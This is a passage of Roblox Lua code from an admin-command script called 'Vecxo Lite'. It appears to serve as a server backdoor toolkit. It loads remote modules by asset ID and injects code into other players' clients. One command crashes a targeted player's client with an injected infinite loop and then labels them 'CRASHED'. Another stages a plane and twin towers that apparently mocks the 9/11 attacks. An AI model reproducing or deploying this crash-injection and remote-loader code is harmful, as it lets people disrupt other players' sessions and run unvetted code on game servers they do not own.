						for i = 1,4 do
							potato:Clone().Parent = sender.Backpack
						end
					end
				end
			else
				for i = 1,5 do
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato"):Clone().Parent = sender.Backpack
				end
			end

			plr.Character.HumanoidRootPart.Anchored = true
			local fortnitesus = true

			local co = coroutine.create(function()
				repeat
					sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5,0,2)
					task.wait()
				until fortnitesus == false
			end)

			coroutine.resume(co)

			local f = Instance.new("ForceField", plr.Character)
			local ff = Instance.new("ForceField", sender.Character)

			for i,v in pairs(sender.Backpack:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v.Parent = sender.Character
					v:Activate()
				end
			end

			repeat task.wait() until plr.Character:FindFirstChild("HotPotato")

			fortnitesus = false
			sender.Character.HumanoidRootPart.CFrame = rnpos
			ff:Destroy()

			for i,v in pairs(sender.Character:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v:Destroy()
				end
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do end

			]]
			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Name = "Crash"
			scr.Enabled = true

			local timeout = tick()

			repeat task.wait() until table.find(_G.rworded, plr.Name) or tick() - timeout >= 5

			local ended = tick()
			local takentime = ended - begin
			local kicktime

			if takentime < 1 then
				kicktime = string.format("%.0fms", takentime * 1000)
			else
				kicktime = string.format("%.1fs", takentime)
			end
			for i,p in pairs(workspace:GetChildren()) do
				if p:IsA("Tool") and p.Name == "HotPotato" then
					p:Destroy()
				end
			end
			for i,p in pairs(plr.Character:GetChildren()) do
				if p:IsA("Tool") and p.Name == "HotPotato" then
					p:Destroy()
				end
			end
			local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
			local t = Instance.new("TextLabel", b)
			b.Size = UDim2.new(0, 50, 0, 50)
			b.ExtentsOffset = Vector3.new(0, 7, 0)
			b.Name = "KICKED"
			t.Size = UDim2.new(0, 50, 0, 20)
			t.BackgroundTransparency = 1

			notify(sender, "[Vecxo Lite]: ", "Kicked ".. plr.Name .." in ".. kicktime)

			t.Text = "[ CRASHED ]\nin ".. kicktime
			t.TextSize = 25
			t.Font = Enum.Font.SourceSansBold
			t.TextColor3 = Color3.fromRGB(0, 255, 0)
			t.Name = "TEXT"
			t.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
			b.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
		end
	elseif cmd == "!antikill" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if not table.find(AutoRespawn, plr.Name) then
				table.insert(AutoRespawn, plr.Name)
			else
				notifyv2(sender, "[Vecxo Lite]:", "✅ "..plr.Name .. " already has antikill enabled!")
				return
			end
			vecxoconnections["AntiKill3"](plr)
		end
		for i, plr in ipairs(targets) do
			if table.find(AutoRespawn, plr.Name) then
				table.remove(AutoRespawn, table.find(AutoRespawn, plr.Name))
			end
		end
	elseif cmd == "!kfc" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC") then
			local KFC = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC"):Clone()
			KFC.Parent = workspace
			KFC.PrimaryPart = KFC:FindFirstChild("Union")
			KFC:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC") then
			local success, fail = pcall(function()
				require(87631077502363).load("KFC")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "KFC failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end
	elseif cmd == "!711" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11") then
			local seveneleven = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11"):Clone()
			seveneleven.Parent = workspace
			seveneleven.PrimaryPart = seveneleven:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			seveneleven:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11") then
			local success, fail = pcall(function()
				require(87631077502363).load("7-11")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
				building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "7-11 failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
			building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end
	elseif cmd == "!basketball" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball") then
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball") then
			local success, fail = pcall(function()
				require(87631077502363).load("Basketball")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true)
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true):Clone()
				basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
				basketball.Parent = workspace
				basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Basketball failed to load: ".. fail)
			end
		else
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end
	elseif cmd == "!mcdonalds" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's") then
			local mcd = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's"):Clone()
			mcd.Parent = workspace
			mcd.PrimaryPart = mcd:FindFirstChild("Floor")
			mcd:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's") then
			local success, fail = pcall(function()
				--require(83374861646895) -- McDonald's
				require(87631077502363).load("McDonald's")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
				building.PrimaryPart = building:FindFirstChild("Floor")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "McDonalds failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
			building.PrimaryPart = building:FindFirstChild("Floor")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end
	elseif cmd == "!burgerking" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing") then
			local BurgerKing = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing"):Clone()
			BurgerKing.Parent = workspace
			BurgerKing.PrimaryPart = BurgerKing:FindFirstChild("Part")
			BurgerKing:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing") then
			local success, fail = pcall(function()
				require(87631077502363).load("BurgerKing")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
				building.PrimaryPart = building:FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Burger King failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
			building.PrimaryPart = building:FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end
	elseif cmd == "!subway" then
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("SubWay") then
			local SubWay = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Subway"):Clone()
			SubWay.Parent = workspace
			SubWay.PrimaryPart = SubWay:FindFirstChild("Union")
			SubWay:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SubWay") then
			local success, fail = pcall(function()
				require(87631077502363).load("Subway")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Subway failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end
	elseif cmd == "!towers" then
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane") then
			local success, fail = pcall(function()
				require(87631077502363).load("Airplane")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane")
				local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
				plane.Parent = workspace
				plane.Locked = true

				local f = Instance.new("Folder", workspace)
				local a = Instance.new("Part", f)
				local b = Instance.new("Part", f)
				local c = Instance.new("Part", f)

				f.Name = "Thing"

				a.CFrame = CFrame.new(-85, 250.2, 93)
				a.Size = Vector3.new(4, 59, 4)
				a.Reflectance = 0.2
				a.BrickColor = BrickColor.new("Dark stone grey")
				a.Locked = true
				a.Anchored = true

				b.CFrame = CFrame.new(-98, 110.7, 81)
				b.Size = Vector3.new(40, 220, 40)
				b.Reflectance = 0.2
				b.BrickColor = BrickColor.new("Dark stone grey")
				b.Locked = true
				b.Anchored = true

				c.CFrame = CFrame.new(-172, 110.7, 81)
				c.Size = Vector3.new(40, 220, 40)
				c.Reflectance = 0.2
				c.BrickColor = BrickColor.new("Dark stone grey")
				c.Locked = true
				c.Anchored = true

				for i,v in pairs(game.Players:GetPlayers()) do
					if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
						local ticking = tick()
						require(112691275102014).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

					if not goog then
						warn("goog failed to be added, command can not continue")
						notify(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = [[
						
						local plane = workspace:WaitForChild("Airplane")
						local camera = workspace.Camera
						camera.CameraSubject = plane

						repeat task.wait() until not workspace:FindFirstChild("Airplane")

						camera.CameraSubject = game.Players.LocalPlayer.Character

						script:Destroy()

					]]

					if v.Character then
						scr.Parent = v.Character
					else
						scr.Parent = v:WaitForChild("PlayerGui")
					end

					scr.Enabled = true
				end
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Plane failed to load: ".. fail)
			end
		else
			local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
			plane.Parent = workspace
			plane.Locked = true

			local f = Instance.new("Folder", workspace)
			local a = Instance.new("Part", f)
			local b = Instance.new("Part", f)
			local c = Instance.new("Part", f)

			f.Name = "Thing"

			a.CFrame = CFrame.new(-85, 250.2, 93)
			a.Size = Vector3.new(4, 59, 4)
			a.Reflectance = 0.2
			a.BrickColor = BrickColor.new("Dark stone grey")
			a.Locked = true
			a.Anchored = true

			b.CFrame = CFrame.new(-98, 110.7, 81)
			b.Size = Vector3.new(40, 220, 40)
			b.Reflectance = 0.2
			b.BrickColor = BrickColor.new("Dark stone grey")
			b.Locked = true
			b.Anchored = true

			c.CFrame = CFrame.new(-172, 110.7, 81)
			c.Size = Vector3.new(40, 220, 40)
			c.Reflectance = 0.2
			c.BrickColor = BrickColor.new("Dark stone grey")
			c.Locked = true
			c.Anchored = true

			for i,v in pairs(game.Players:GetPlayers()) do
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notify(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
					
					local plane = workspace:WaitForChild("Airplane")
					local camera = workspace.Camera
					camera.CameraSubject = plane

					repeat task.wait() until not workspace:FindFirstChild("Airplane")

					camera.CameraSubject = game.Players.LocalPlayer.Character

					script:Destroy()

				]]

				if v.Character then
					scr.Parent = v.Character
				else
					scr.Parent = v:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
	elseif cmd == "!unantikill" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if table.find(AutoRespawn, plr.Name) then
				table.remove(AutoRespawn, table.find(AutoRespawn, plr.Name))
			end
		end
	elseif cmd == "!hwl" and args[2] then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			if #targets == 0 then
				notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
				return
			end
			for i, targetPlayer in ipairs(targets) do
				if not table.find(whitelisted, targetPlayer.Name) then
					table.insert(whitelisted, targetPlayer.Name)
				end
				if not table.find(exclusivewl, targetPlayer.Name) then
					local token = generateToken()
					authTokens[targetPlayer] = token
					TokenRemote:FireClient(targetPlayer, token)
					table.insert(exclusivewl, targetPlayer.Name)
				end
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				notify(sender, "[Vecxo Lite]:", "✅ Hard whitelisted " .. targetPlayer.Name)
				notifyv2(targetPlayer, "[Vecxo Lite]:", "✅ You have been hard whitelisted which means you are now allowed to use restricted commands. Usage: !cmds")
			end
		end
	elseif cmd == "!cmdbar" then
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local cmdEvent = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandEvent")
local TokenRemote = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandToken")
local currentToken = nil

TokenRemote.OnClientEvent:Connect(function(newToken)
    if currentToken ~= newToken then
        currentToken = newToken
    end
end)


local function createCmdBar()
	local existing = playerGui:FindFirstChild("VecxoCommandBar")
	if existing then
		existing:Destroy()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoCommandBar"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Name = "MainFrame"
	frame.Size = UDim2.new(0, 300, 0, 40)
	frame.Position = UDim2.new(0, 10, 1, -50) -- bottom left with margin
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.AnchorPoint = Vector2.new(0, 1)

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -40, 1, 0)
	title.Position = UDim2.new(0, 0, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "[Vecxo Lite]: Command Bar"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.Code
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame

	local toggleBtn = Instance.new("TextButton")
	toggleBtn.Name = "ToggleBtn"
	toggleBtn.Size = UDim2.new(0, 40, 1, 0)
	toggleBtn.Position = UDim2.new(1, -40, 0, 0)
	toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	toggleBtn.Text = "▼"
	toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleBtn.Font = Enum.Font.Code
	toggleBtn.TextSize = 24
	toggleBtn.Parent = frame

	local textBox = Instance.new("TextBox")
	textBox.Name = "CmdTextBox"
	textBox.Size = UDim2.new(1, 0, 0, 30)
	textBox.Position = UDim2.new(0, 0, 1, 5)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.Font = Enum.Font.Code
	textBox.TextSize = 18
	textBox.PlaceholderText = "Enter here..."
	textBox.Text = "" -- Fix initial Text showing "TextBox"
	textBox.ClearTextOnFocus = false
	textBox.Parent = frame
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextWrapped = false
	textBox.TextEditable = true

	textBox.BackgroundTransparency = 1
	textBox.TextTransparency = 1
	textBox.Visible = true -- keep visible, but transparent initially

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local expandedSize = UDim2.new(0, 300, 0, 80)
	local collapsedSize = UDim2.new(0, 300, 0, 40)

	local isOpen = false
	local function toggleCmdBar()
		if isOpen then
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 1,
				TextTransparency = 1
			}):Play()
			toggleBtn.Text = "▼"
			TweenService:Create(frame, tweenInfo, {Size = collapsedSize}):Play()
			isOpen = false
			task.delay(0.3, function()
				if not isOpen then
					textBox.Visible = false
				end
			end)
		else
			textBox.Visible = true
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 0,
				TextTransparency = 0
			}):Play()
			toggleBtn.Text = "▲"
			TweenService:Create(frame, tweenInfo, {Size = expandedSize}):Play()
			isOpen = true
			textBox:CaptureFocus()
		end
	end

	toggleBtn.MouseButton1Click:Connect(toggleCmdBar)

	textBox.Focused:Connect(function()
		textBox.PlaceholderText = ""
	end)

	textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and textBox.Text ~= "" then
        if not currentToken then
            local RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("VecxoRequestToken")
            currentToken = RemoteFunction:InvokeServer()
            if not currentToken then
                return
            end
        end
        cmdEvent:FireServer(currentToken, "!" .. textBox.Text)
        textBox.Text = ""
    	end
	end)
end

createCmdBar()


			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
			plr.CharacterAdded:Connect(function()
				task.wait(0.5)
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
			
			local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local cmdEvent = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandEvent")
local TokenRemote = game:GetService("ReplicatedStorage"):WaitForChild("VecxoCommandToken")
local currentToken = nil

TokenRemote.OnClientEvent:Connect(function(newToken)
    if currentToken ~= newToken then
        currentToken = newToken
    end
end)


local function createCmdBar()
	local existing = playerGui:FindFirstChild("VecxoCommandBar")
	if existing then
		existing:Destroy()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoCommandBar"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Name = "MainFrame"
	frame.Size = UDim2.new(0, 300, 0, 40)
	frame.Position = UDim2.new(0, 10, 1, -50) -- bottom left with margin
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.AnchorPoint = Vector2.new(0, 1)

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -40, 1, 0)
	title.Position = UDim2.new(0, 0, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "[Vecxo Lite]: Command Bar"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.Code
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame

	local toggleBtn = Instance.new("TextButton")
	toggleBtn.Name = "ToggleBtn"
	toggleBtn.Size = UDim2.new(0, 40, 1, 0)
	toggleBtn.Position = UDim2.new(1, -40, 0, 0)
	toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	toggleBtn.Text = "▼"
	toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleBtn.Font = Enum.Font.Code
	toggleBtn.TextSize = 24
	toggleBtn.Parent = frame

	local textBox = Instance.new("TextBox")
	textBox.Name = "CmdTextBox"
	textBox.Size = UDim2.new(1, 0, 0, 30)
	textBox.Position = UDim2.new(0, 0, 1, 5)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.Font = Enum.Font.Code
	textBox.TextSize = 18
	textBox.PlaceholderText = "Enter here..."
	textBox.Text = "" -- Fix initial Text showing "TextBox"
	textBox.ClearTextOnFocus = false
	textBox.Parent = frame
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextWrapped = false
	textBox.TextEditable = true

	textBox.BackgroundTransparency = 1
	textBox.TextTransparency = 1
	textBox.Visible = true -- keep visible, but transparent initially

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local expandedSize = UDim2.new(0, 300, 0, 80)
	local collapsedSize = UDim2.new(0, 300, 0, 40)

	local isOpen = false
	local function toggleCmdBar()
		if isOpen then
			-- Fade out textbox
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 1,
				TextTransparency = 1
			}):Play()
			toggleBtn.Text = "▼"
			TweenService:Create(frame, tweenInfo, {Size = collapsedSize}):Play()
			isOpen = false

			task.delay(0.3, function()
				if not isOpen then
					textBox.Visible = false
				end
			end)
		else
			textBox.Visible = true
			TweenService:Create(textBox, tweenInfo, {
				BackgroundTransparency = 0,
				TextTransparency = 0
			}):Play()
			toggleBtn.Text = "▲"
			TweenService:Create(frame, tweenInfo, {Size = expandedSize}):Play()
			isOpen = true
			textBox:CaptureFocus()
		end
	end

	toggleBtn.MouseButton1Click:Connect(toggleCmdBar)

	textBox.Focused:Connect(function()
		textBox.PlaceholderText = ""
	end)

	textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and textBox.Text ~= "" then
        if not currentToken then
            local RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("VecxoRequestToken")
            currentToken = RemoteFunction:InvokeServer()
            if not currentToken then
                return
            end
        end
        cmdEvent:FireServer(currentToken, "!" .. textBox.Text)
        textBox.Text = ""
    	end
	end)
end

createCmdBar()


			]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end)
		end
	elseif cmd == "!unwl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if targetPlayer.Name ~= "Reloxz" then
				task.spawn(function()
